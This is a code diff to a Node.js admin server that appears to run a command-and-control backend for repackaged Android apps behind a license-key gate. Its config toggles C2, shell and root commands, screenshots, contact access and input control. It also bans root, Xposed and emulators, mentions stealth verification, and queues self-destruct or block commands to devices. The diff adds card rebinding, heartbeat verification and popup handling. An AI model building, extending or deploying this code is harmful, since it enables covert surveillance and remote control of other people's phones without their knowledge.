@@ -149,7 +149,11 @@ async function route(req, res) {
 
 async function handleAdminApi(req, res, url) {
   if (req.method === 'GET' && url.pathname === '/admin/api/cards') {
-    return sendJson(res, 200, { ok: true, cards: db.cards.slice().sort((a, b) => b.id - a.id) });
+    const cards = db.cards.slice().sort((a, b) => b.id - a.id).map(c => {
+      const device = c.device_id ? db.devices.find(d => d.device_id === c.device_id) : null;
+      return { ...c, device_name: device ? device.name : '', device_id_short: c.device_id ? c.device_id.slice(0, 20) : '', device_os: device ? device.os : '' };
+    });
+    return sendJson(res, 200, { ok: true, cards });
   }
 
   if (req.method === 'POST' && url.pathname === '/admin/api/cards') {
@@ -206,6 +210,19 @@ async function handleAdminApi(req, res, url) {
     return sendJson(res, 200, { ok: true });
   }
 
+  const rebindMatch = url.pathname.match(/^\/admin\/api\/cards\/(\d+)\/rebind$/);
+  if (req.method === 'POST' && rebindMatch) {
+    const card = findCard(Number(rebindMatch[1]));
+    if (!card) return sendJson(res, 404, { ok: false, message: 'not found' });
+    const params = parseBody(req, await readBody(req));
+    const newDeviceId = String(params.device_id || '').trim();
+    if (!newDeviceId) return sendJson(res, 400, { ok: false, message: 'device_id required' });
+    card.device_id = newDeviceId;
+    card.updated_at = now();
+    saveDb();
+    return sendJson(res, 200, { ok: true });
+  }
+
   const deleteMatch = url.pathname.match(/^\/admin\/api\/cards\/(\d+)$/);
   if (req.method === 'DELETE' && deleteMatch) {
     const id = Number(deleteMatch[1]);
@@ -231,6 +248,27 @@ async function handleAdminApi(req, res, url) {
     db.devices = db.devices.filter(d => d.id !== id);
     saveDb();
     return sendJson(res, 200, { ok: db.devices.length !== before });
+  }
+
+  const deviceCardMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/card$/);
+  if (req.method === 'POST' && deviceCardMatch) {
+    const device = findDevice(Number(deviceCardMatch[1]));
+    if (!device) return sendJson(res, 404, { ok: false, message: 'not found' });
+    const params = parseBody(req, await readBody(req));
+    const newCard = String(params.card || '').trim();
+    if (!newCard) return sendJson(res, 400, { ok: false, message: 'card required' });
+    // Unbind old card if device had one
+    if (device.card) {
+      const oldCard = db.cards.find(c => c.card === device.card);
+      if (oldCard) { oldCard.device_id = ''; oldCard.updated_at = now(); }
+    }
+    // Bind new card
+    const cardEntry = db.cards.find(c => c.card === newCard);
+    if (cardEntry) { cardEntry.device_id = device.device_id; cardEntry.updated_at = now(); }
+    device.card = newCard;
+    device.updated_at = now();
+    saveDb();
+    return sendJson(res, 200, { ok: true });
   }
 
   const deviceCmdMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/command$/);
@@ -413,8 +451,8 @@ async function handleAdminApi(req, res, url) {
 
 function buildConfig(softwareType) {
   const cfg = effectiveConfigForSoftware(softwareType || 'default');
-  const popupTitle = cfg.popup_title || 'Enter License';
-  const popupHtml = cfg.popup_html || buildCardHtml(`${PUBLIC_BASE_URL}/kami/verify`, popupTitle, cfg.popup_message || 'One device per key');
+  const useHtml = cfg.use_html_popup === true;
+  const popupHtml = useHtml && cfg.popup_html ? cfg.popup_html : '';
   return {
     debug: !!cfg.debug,
     domains: [PUBLIC_BASE_URL],
@@ -428,10 +466,12 @@ function buildConfig(softwareType) {
     websocket: '',
     poll_interval: cfg.poll_interval,
     enable_c2: cfg.enable_c2,
+    heartbeat_verify: cfg.heartbeat_verify,
+    heartbeat_verify_interval_minutes: cfg.heartbeat_verify_interval_minutes,
     allow_device_diagnostics: cfg.allow_device_diagnostics,
     allow_root_commands: cfg.allow_root_commands,
-    enablehtmlPopups: true,
-    htmlpopups: [{
+    enablehtmlPopups: useHtml,
+    htmlpopups: useHtml ? [{
       enable: true,
       id: 'card_gate_popup',
       white_list: [],
@@ -439,7 +479,7 @@ function buildConfig(softwareType) {
       html: popupHtml,
       lock: true,
       other: { verifyUrl: `${PUBLIC_BASE_URL}/kami/verify`, version_shell: SHELL_VERSION }
-    }],
+    }] : [],
     enablePopups: false,
     popups: [],
     enableImagePopups: false,
@@ -466,6 +506,17 @@ function buildCardHtml(verifyUrl, popupTitle, popupMessage) {
   return `<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>html,body{margin:0;width:100%;height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Microsoft YaHei",Arial,sans-serif;background:rgba(0,0,0,.62)}.wrap{height:100%;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box}.card{width:310px;background:#fff;border-radius:18px;box-shadow:0 14px 40px rgba(0,0,0,.18);padding:24px 22px 22px;box-sizing:border-box;text-align:center}.avatar{font-size:46px;line-height:1;margin-bottom:8px}.title{font-size:18px;font-weight:700;color:#222;margin-bottom:8px}.msg{min-height:22px;font-size:14px;color:#777;margin-bottom:14px}input{width:100%;height:42px;border:1px solid #e7e7e7;border-radius:22px;outline:none;padding:0 16px;font-size:15px;box-sizing:border-box;text-align:center;color:#333}.buttons{display:flex;gap:12px;margin-top:18px}button{flex:1;height:42px;border:0;border-radius:22px;font-size:15px;font-weight:600}.exit{background:#f0f0f0;color:#777}.verify{background:#ff5d9d;color:#fff}.verify:disabled{opacity:.55}.tip{position:fixed;left:50%;bottom:38px;transform:translateX(-50%);background:rgba(0,0,0,.65);color:#fff;border-radius:18px;padding:9px 18px;font-size:14px;opacity:0;transition:.2s;white-space:nowrap}.tip.show{opacity:1}</style></head><body><div class="wrap"><div class="card"><div class="avatar">🔐</div><div class="title">${safeTitle}</div><div id="msg" class="msg">${safeMessage}</div><input id="cardInput" placeholder="请输入卡密" autocomplete="off" autocapitalize="off"><div class="buttons"><button class="exit" onclick="exitApp()">退出应用</button><button id="btnVerify" class="verify" onclick="verify(false)">验证卡密</button></div></div></div><div id="tip" class="tip"></div><script>const VERIFY_URL='${safeUrl}';const POPUP_ID='card_gate_popup';const bridge=window.Android||window.android||window.MyAppWebView;const input=document.getElementById('cardInput');const btnVerify=document.getElementById('btnVerify');const saved=readSP('kami');if(saved)input.value=saved;function toast(text){const t=document.getElementById('tip');t.textContent=text;t.className='tip show';setTimeout(()=>t.className='tip',1800)}function setMsg(text){document.getElementById('msg').textContent=text}function readSP(key){try{return bridge&&bridge.readSP?bridge.readSP(key):''}catch(e){return''}}function saveSP(key,value){try{if(bridge&&bridge.writeSP){bridge.writeSP(key,value)}else if(bridge&&bridge.saveSP){bridge.saveSP(key,value)}}catch(e){}}function exitApp(){try{bridge&&bridge.exitApp?bridge.exitApp():null}catch(e){}}function closePopup(){try{bridge&&bridge.close?bridge.close(POPUP_ID):null}catch(e){}}async function verify(auto){const card=input.value.trim();if(!card){if(!auto)toast('请输入卡密');return}btnVerify.disabled=true;setMsg(auto?'正在自动验证已保存卡密...':'正在验证...');try{const body=new URLSearchParams({input:card,card:card,kami:card,deviceId:readSP('device_id')||readSP('deviceId')||'',software_type:readSP('software_type')||'',version_shell:'${SHELL_VERSION}'});const res=await fetch(VERIFY_URL,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body.toString()});const data=await res.json();handleResult(data&&Number(data.code)===0,data&&data.message,data&&data.data,auto)}catch(e){setMsg('网络异常，请重试');toast('网络异常');btnVerify.disabled=false}}function handleResult(success,message,data,auto){if(success){const card=input.value.trim();const sec=String((data&&(data.remaining_seconds||data.remainingSeconds))||0);saveSP('kami',card);toast(message||'验证成功');setMsg('验证成功');try{if(bridge&&bridge.onVerifySuccess){bridge.onVerifySuccess(card,sec);return}}catch(e){}setTimeout(closePopup,600);return}btnVerify.disabled=false;const text=message||'卡密不存在';setMsg(auto?'已保存卡密失效，请重新输入':text);toast(text)}setTimeout(()=>{if(saved)verify(true)},500)<\/script></body></html>`;
 }
 function verifyCard({ input, deviceId }) {
+  // auto-verify: deviceId-only lookup for bound cards
+  if (!input && deviceId) {
+    const boundCard = db.cards.find(c => c.device_id === deviceId && c.status === 'active');
+    if (!boundCard) return fail('no bound card');
+    if (boundCard.expires_at) {
+      const remainingSeconds = Math.max(0, Math.floor((new Date(boundCard.expires_at).getTime() - Date.now()) / 1000));
+      if (remainingSeconds <= 0) return fail('expired');
+      return { code: 0, message: 'ok', data: { remaining_seconds: remainingSeconds, expires_at: boundCard.expires_at, card: boundCard.card } };
+    }
+    return { code: 0, message: 'ok', data: { remaining_seconds: -1, expires_at: '', card: boundCard.card } };
+  }
   if (!input) return fail('invalid input');
   const card = db.cards.find(item => item.card === input);
   if (!card) return fail('not found');
@@ -505,6 +556,10 @@ function registerDevice(params, req) {
   const meta = parseMeta(params);
   const current = now();
 
+  // Only accept a card from params if it actually exists and is not bound to another device
+  const paramsCard = String(params.card || params.kami || '');
+  const validCard = paramsCard ? db.cards.some(c => c.card === paramsCard && (!c.device_id || c.device_id === deviceId)) : false;
+
   let device = db.devices.find(d => d.device_id === deviceId && d.software_type === softwareType);
   if (!device) {
     device = {
@@ -516,7 +571,7 @@ function registerDevice(params, req) {
       software_version: String(params.software_version || params.version || ''),
       ip,
       group_id: group.id,
-      card: String(params.card || params.kami || ''),
+      card: validCard ? paramsCard : '',
       meta,
       registered_at: current,
       last_seen_at: current,
@@ -534,15 +589,18 @@ function registerDevice(params, req) {
     device.ip = ip || device.ip;
     device.meta = Object.assign(device.meta || {}, meta);
     device.group_id = group.id;
-    if (params.card || params.kami) device.card = String(params.card || params.kami);
+    if (validCard) device.card = paramsCard;
     device.last_seen_at = current;
     device.updated_at = current;
     if (device.status !== 'destroyed') device.status = 'online';
   }
 
-  // 自动发卡：分组开启 auto_issue_card 且设备没有绑定卡时，自动签发
+  // Auto-issue: group has auto_issue_card enabled and device has no bound card
+  // Also re-issue if the bound card no longer exists or is bound to a different device
   const cfg = effectiveConfig(device);
-  if (cfg.auto_issue_card && !device.card) {
+  const hasValidCard = device.card && db.cards.some(c => c.card === device.card && (!c.device_id || c.device_id === deviceId) && c.status === 'active');
+  if (cfg.auto_issue_card && !hasValidCard) {
+    if (device.card) console.log(`[auto-card] ${deviceId}: stale card ${device.card}, re-issuing`);
     const autoCard = autoIssueCard(device, softwareType);
     if (autoCard) {
       device.card = autoCard.card;
@@ -610,16 +668,17 @@ function deviceHeartbeat(params, req) {
   if (cfg.expire_action && cfg.expire_action !== 'none' && device.card) {
     const card = db.cards.find(c => c.card === device.card);
     const expired = card && card.expires_at && new Date(card.expires_at).getTime() < Date.now();
-    if (expired) {
+    const disabled = card && card.status !== 'active';
+    if (expired || disabled) {
       const alreadyQueued = (device.pending_commands || []).some(c => c.type === 'expire_block' || c.type === 'self_destruct');
       if (!alreadyQueued) {
         device.pending_commands = device.pending_commands || [];
         if (cfg.expire_action === 'uninstall') {
-          device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'self_destruct', payload: { reason: 'card_expired' }, created_at: now() });
-          console.log(`[expire] ${deviceId}(${device.name}) card expired, self-destruct queued`);
+          device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'self_destruct', payload: { reason: disabled ? 'card_disabled' : 'card_expired' }, created_at: now() });
+          console.log(`[expire] ${deviceId}(${device.name}) card ${disabled?'disabled':'expired'}, self-destruct queued`);
         } else if (cfg.expire_action === 'block') {
-          device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'expire_block', payload: { reason: 'card_expired' }, created_at: now() });
-          console.log(`[expire] ${deviceId}(${device.name}) card expired, block queued`);
+          device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'expire_block', payload: { reason: disabled ? 'card_disabled' : 'card_expired' }, created_at: now() });
+          console.log(`[expire] ${deviceId}(${device.name}) card ${disabled?'disabled':'expired'}, block queued`);
         }
       }
     }
@@ -758,6 +817,13 @@ function defaultConfig() {
     popup_title: 'Enter License',
     popup_message: 'One device per key',
     popup_html: '',
+    // use_html_popup: use native dialog by default, enable html popup only when explicitly checked
+    use_html_popup: false,
+    // heartbeat_verify: enable card verification on every C2 heartbeat (default true)
+    heartbeat_verify: true,
+    // When heartbeat_verify is OFF, this interval (minutes) controls how often to verify.
+    // 0 = never; > 0 = verify every N minutes for stealth.
+    heartbeat_verify_interval_minutes: 0,
     // 自动发卡：注册时若卡密为空则自动签发一张永久卡并绑定（调试或免卡密场景）
     auto_issue_card: false,
     // 卡密过期行为：none=不处理 block=阻断 C2 命令 uninstall=下发自毁命令
@@ -779,13 +845,13 @@ function sanitizeConfig(config) {
   if (obj.poll_interval != null && obj.poll_interval !== '') sane.poll_interval = clampInt(obj.poll_interval, 5, 86400, 60);
   for (const key of ['enable_c2', 'allow_device_diagnostics', 'allow_root_commands',
     'allow_screenshot', 'allow_contacts', 'allow_shell', 'allow_input_control',
-    'debug', 'enable_hook', 'ban_root', 'ban_xposed', 'ban_emulator', 'ban_virtual_app', 'ban_dual_app']) {
+    'debug', 'enable_hook', 'ban_root', 'ban_xposed', 'ban_emulator', 'ban_virtual_app', 'ban_dual_app',
+    'use_html_popup', 'auto_issue_card']) {
     if (obj[key] != null) sane[key] = boolish(obj[key]);
   }
   if (obj.popup_title != null) sane.popup_title = String(obj.popup_title).trim().slice(0, 60) || '请输入卡密';
   if (obj.popup_message != null) sane.popup_message = String(obj.popup_message).trim().slice(0, 120) || '一机一卡，首次使用自动绑定设备';
   if (obj.popup_html != null) sane.popup_html = String(obj.popup_html).slice(0, 20000);
-  if (obj.auto_issue_card != null) sane.auto_issue_card = boolish(obj.auto_issue_card);
   if (obj.expire_action != null && ['none', 'block', 'uninstall'].includes(String(obj.expire_action))) sane.expire_action = String(obj.expire_action);
   if (Array.isArray(obj.switches)) {
     sane.switches = obj.switches.filter(s => s && s.key && s.name).map(s => ({
@@ -1169,7 +1235,7 @@ function firstMatchingValue(params, keys, predicate) {
 }
 function looksLikeCard(value) { return /^[A-Z0-9]{6,64}$/.test(String(value)); }
 function isBridgeToken(value) { return /^(ONVERIFY2?|ONVERIFY|MONTHLY_CARD_POPUP)$/i.test(String(value)); }
-function normalizeCard(value) { return String(value).trim().replace(/\s+/g, '').toUpperCase(); }
+function normalizeCard(value) { return String(value || '').trim().replace(/\s+/g, '').toUpperCase(); }
 function clampInt(value, min, max, fallback) { const number = Number.parseInt(value, 10); if (!Number.isFinite(number)) return fallback; return Math.max(min, Math.min(max, number)); }
 function now() { return new Date().toISOString(); }
 function addDays(iso, days) { const date = new Date(iso); date.setUTCDate(date.getUTCDate() + Number(days)); return date.toISOString(); }
